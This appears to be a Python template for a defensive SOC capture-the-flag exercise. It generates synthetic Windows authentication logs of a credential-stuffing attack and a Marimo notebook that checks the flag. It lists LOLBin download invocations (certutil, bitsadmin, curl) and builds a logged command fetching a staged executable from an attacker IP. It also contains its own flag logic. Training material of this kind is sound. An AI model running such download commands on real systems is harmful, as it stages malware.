"""Human-crafted SOC Authentication Triage Template (Flagship Module 1)."""

from pathlib import Path
from typing import Dict, Any, List, Optional
import datetime
import hashlib
import json
import random
import shutil

from app.modules.digital_governance.services.templates.base_template import BaseChallengeTemplate


class SocAuthTemplate(BaseChallengeTemplate):
    """
    Template for Off-Hours Authentication Triage & Credential Stuffing Analysis.
    Generates synthetic Windows event telemetry (Events 4624, 4625, 4688) with
    dynamic attacker IPs, compromised usernames, timestamps, and flags.
    """

    template_id = "soc-auth-investigation"
    title = "SOC Incident: Authentication Triage & Credential Stuffing"
    category = "SOC Investigation"
    difficulty = "Beginner"
    base_points = 100
    duration_minutes = 45
    competency_id = "soc_investigation"
    competency_weight = 1.0
    tags = ["soc", "authentication", "brute-force", "event-4625", "event-4624", "lolbin", "certutil", "cybersecurity", "cert-in"]
    mitre_techniques = ["T1110.001", "T1078.002", "T1105"]

    CODENAMES = [
        "Operation NightShift",
        "Operation VajraShield",
        "Operation IronRaven",
        "Operation ShadowGate",
        "Operation DarkCascade",
        "Operation FrostBite",
        "Operation CyberVault",
    ]

    TARGET_ACCOUNTS = [
        "admin_finance",
        "svc_backup",
        "fin_director",
        "secops_lead",
        "payroll_admin",
        "treasury_nodal",
        "corp_executive",
    ]

    TARGET_HOSTS = [
        ("PAYROLL-SRV01", "10.0.4.50"),
        ("FINANCE-DC01", "10.0.4.10"),
        ("TREASURY-GW02", "10.0.4.99"),
        ("HR-ERP-SRV", "10.0.4.75"),
    ]

    LOLBIN_TOOLS = [
        ("certutil.exe", "-urlcache -split -f"),
        ("bitsadmin.exe", "/transfer job /download /priority high"),
        ("curl.exe", "-s -O"),
    ]

    def get_slot_schema(self) -> Dict[str, Dict[str, Any]]:
        return {
            "incident_codename": {"type": "str", "description": "Investigation operation codename"},
            "attacker_ip": {"type": "str", "description": "External brute-force source IP"},
            "victim_user": {"type": "str", "description": "Compromised administrative account"},
            "target_host": {"type": "str", "description": "Target server hostname"},
            "target_internal_ip": {"type": "str", "description": "Target server internal IP"},
            "brute_attempts": {"type": "int", "description": "Number of failed password attempts"},
            "lolbin_tool": {"type": "str", "description": "Living-off-the-land download binary"},
            "lolbin_args": {"type": "str", "description": "Arguments supplied to lolbin tool"},
            "staged_binary": {"type": "str", "description": "Name of dropped staging payload"},
            "breach_offset_min": {"type": "int", "description": "Minutes into off-hours when breach occurred"},
        }

    def generate_random_slots(
        self, seed: Optional[str] = None, overrides: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        rng = random.Random(seed) if seed else random.Random()

        host, internal_ip = rng.choice(self.TARGET_HOSTS)
        lolbin, lolbin_args = rng.choice(self.LOLBIN_TOOLS)

        slots = {
            "incident_codename": rng.choice(self.CODENAMES),
            "attacker_ip": f"{rng.randint(45, 198)}.{rng.randint(10, 250)}.{rng.randint(1, 254)}.{rng.randint(2, 250)}",
            "victim_user": rng.choice(self.TARGET_ACCOUNTS),
            "target_host": host,
            "target_internal_ip": internal_ip,
            "brute_attempts": rng.randint(45, 95),
            "lolbin_tool": lolbin,
            "lolbin_args": lolbin_args,
            "staged_binary": f"update_{rng.randint(1000, 9999)}.exe",
            "breach_offset_min": rng.randint(15, 55),
            "seed_hash": hashlib.md5(f"{seed}-{rng.random()}".encode()).hexdigest(),
        }

        if overrides:
            slots.update(overrides)

        return slots

    def compute_flag(self, slots: Dict[str, Any]) -> str:
        raw = f"{slots['victim_user']}_{slots['lolbin_tool'].split('.')[0]}_{slots['seed_hash'][:6]}"
        return f"FLAG{{{raw.lower()}}}"

    def generate_hints(self, slots: Dict[str, Any]) -> List[Dict[str, Any]]:
        return [
            {
                "id": 1,
                "content": "Filter authentication events where event_id is 4625 (logon failure) and group by source_ip to discover the anomalous brute force origin.",
                "penalty": 15,
            },
            {
                "id": 2,
                "content": f"Once you locate the attacker IP, filter for the subsequent successful logon (Event 4624) on target {slots['target_host']}. The post-exploitation command line (Event 4688) contains the flag.",
                "penalty": 25,
            },
        ]

    def generate_objectives(self, slots: Dict[str, Any]) -> List[str]:
        return [
            f"Isolate anomalous external logon failures targeting internal workstation {slots['target_host']}.",
            f"Identify the compromised privileged account ('{slots['victim_user']}') that succeeded during off-hours.",
            f"Analyze subsequent Process Creation (Event 4688) invoking {slots['lolbin_tool']} to extract the incident flag.",
        ]

    def generate_scenario_description(self, slots: Dict[str, Any]) -> str:
        return f"""### Emergency Incident Briefing: {slots['incident_codename']}

**Classified / CERT-In Referral Notice**
At 02:15 IST, the Security Operations Center (SOC) automated monitoring system raised a high-severity alert for off-hours authentication anomalies on high-value asset `{slots['target_host']}` (`{slots['target_internal_ip']}`).

The telemetry stream contains raw Windows Security Event logs spanning legitimate administrative activity alongside a coordinated credential-stuffing assault.

Your mandate as Incident Response Lead:
1. Examine `auth_events.json` using the interactive Marimo analyst notebook.
2. Uncover the adversary's originating public IP and logon failure patterns.
3. Determine the compromised account and analyze the post-authentication Living-off-the-Land command line to recover the incident flag.
"""

    def synthesize_artifacts(
        self, slots: Dict[str, Any], output_dir: Path
    ) -> Dict[str, Path]:
        data_dir = output_dir / "data"
        data_dir.mkdir(parents=True, exist_ok=True)

        events: List[Dict[str, Any]] = []
        base_time = datetime.datetime(2026, 9, 12, 1, 0, 0, tzinfo=datetime.timezone.utc)

        legit_users = ["backup_service", "admin_sync", "operator1", "operator2", "healthcheck"]
        legit_ips = ["10.0.1.15", "10.0.1.20", "10.0.2.5", "192.168.1.100"]

        # 1. Generate 120 baseline legitimate events
        for i in range(120):
            ts = base_time + datetime.timedelta(seconds=i * 45)
            status = "SUCCESS" if (i % 8 != 0) else "FAILURE"
            events.append({
                "timestamp": ts.strftime("%Y-%m-%d %H:%M:%S+00:00"),
                "event_id": 4624 if status == "SUCCESS" else 4625,
                "source_ip": random.choice(legit_ips),
                "target_user": random.choice(legit_users),
                "workstation": slots["target_host"],
                "status": status,
                "auth_package": "Kerberos",
                "process_name": "C:\\Windows\\System32\\lsass.exe",
            })

        # 2. Coordinated brute force spray from attacker IP
        attacker_ip = slots["attacker_ip"]
        victim_user = slots["victim_user"]
        workstation = slots["target_host"]
        flag = self.compute_flag(slots)

        spray_start = base_time + datetime.timedelta(minutes=slots["breach_offset_min"])
        brute_count = slots["brute_attempts"]

        for j in range(brute_count):
            t_event = spray_start + datetime.timedelta(seconds=j * 2)
            events.append({
                "timestamp": t_event.strftime("%Y-%m-%d %H:%M:%S+00:00"),
                "event_id": 4625,
                "source_ip": attacker_ip,
                "target_user": victim_user if (j > brute_count - 5) else f"user_{j % 10}",
                "workstation": workstation,
                "status": "FAILURE",
                "auth_package": "NTLM",
                "process_name": "C:\\Windows\\System32\\lsass.exe",
            })

        # 3. Successful breach logon
        breach_time = spray_start + datetime.timedelta(seconds=brute_count * 2 + 5)
        events.append({
            "timestamp": breach_time.strftime("%Y-%m-%d %H:%M:%S+00:00"),
            "event_id": 4624,
            "source_ip": attacker_ip,
            "target_user": victim_user,
            "workstation": workstation,
            "status": "SUCCESS",
            "auth_package": "NTLM",
            "process_name": "C:\\Windows\\System32\\lsass.exe",
        })

        # 4. Living-off-the-Land post-exploitation command containing flag
        cmd_time = breach_time + datetime.timedelta(seconds=18)
        lolbin = slots.get("lolbin_tool", "certutil.exe")
        args = slots.get("lolbin_args", "-urlcache -split -f")
        staged = slots.get("staged_binary", "update_4821.exe")
        command_line = f"{lolbin} {args} http://{attacker_ip}/{staged} {flag}"

        events.append({
            "timestamp": cmd_time.strftime("%Y-%m-%d %H:%M:%S+00:00"),
            "event_id": 4688,
            "source_ip": attacker_ip,
            "target_user": victim_user,
            "workstation": workstation,
            "status": "SUCCESS",
            "auth_package": "COMMAND",
            "process_name": f"C:\\Windows\\System32\\{lolbin}",
            "command_line": command_line,
        })

        # Sort chronologically
        events.sort(key=lambda x: x["timestamp"])

        data_file = data_dir / "auth_events.json"
        with open(data_file, "w") as f:
            json.dump(events, f, indent=2)

        return {"auth_events.json": data_file}

    def generate_notebook(self, slots: Dict[str, Any], output_dir: Path) -> Path:
        marimo_dir = output_dir / "marimo"
        marimo_dir.mkdir(parents=True, exist_ok=True)
        target_nb = marimo_dir / "challenge.py"

        flag = self.compute_flag(slots)
        dynamic_hash = hashlib.sha256(flag.encode()).hexdigest()

        code = self._generate_fallback_notebook(slots, dynamic_hash)
        target_nb.write_text(code, encoding="utf-8")
        return target_nb

    def _generate_fallback_notebook(self, slots: Dict[str, Any], target_hash: str) -> str:
        return f'''import marimo

__generated_with = "0.17.6"
app = marimo.App(width="full", app_title="SOC Incident: {slots.get('incident_codename', 'Investigation')}")


@app.cell(hide_code=True)
def __():
    import json
    import hashlib
    from pathlib import Path
    import pandas as pd
    import marimo as mo
    return Path, hashlib, json, mo, pd


@app.cell(hide_code=True)
def __(Path, json, pd):
    paths = [Path("data/auth_events.json"), Path("../data/auth_events.json")]
    p = next((x for x in paths if x.exists()), None)
    if p:
        df = pd.DataFrame(json.loads(p.read_text()))
        df["timestamp"] = pd.to_datetime(df["timestamp"])
    else:
        df = pd.DataFrame()
    return df, p


@app.cell
def __(df, mo):
    mo.md(f"""
    # 🛡️ SOC Incident Analysis: {slots.get('incident_codename', 'Operation')}
    Total Telemetry Records: **{{len(df)}}** | Workstation: **{slots.get('target_host', 'Unknown')}**
    """)
    return


@app.cell
def __(df):
    # Failure analysis by IP
    failures = df[df["status"] == "FAILURE"].groupby("source_ip").size().reset_index(name="failed_logons")
    failures.sort_values(by="failed_logons", ascending=False)
    return failures,


@app.cell
def __(hashlib, mo):
    target_hash = "{target_hash}"
    flag_input = mo.ui.text(placeholder="Enter flag e.g. FLAG{{...}}", label="Submit Verified Flag")
    return flag_input, target_hash


@app.cell
def __(flag_input, hashlib, mo, target_hash):
    user_flag = flag_input.value.strip()
    if not user_flag:
        result = mo.md("*(Enter flag above to verify solution)*")
    elif hashlib.sha256(user_flag.encode()).hexdigest() == target_hash:
        result = mo.md("### 🎯 FLAG ACCEPTED! Incident successfully mitigated.")
    else:
        result = mo.md("### ❌ INCORRECT FLAG. Check the post-exploitation LOLBin command.")
    mo.vstack([flag_input, result])
    return result, user_flag


if __name__ == "__main__":
    app.run()
'''
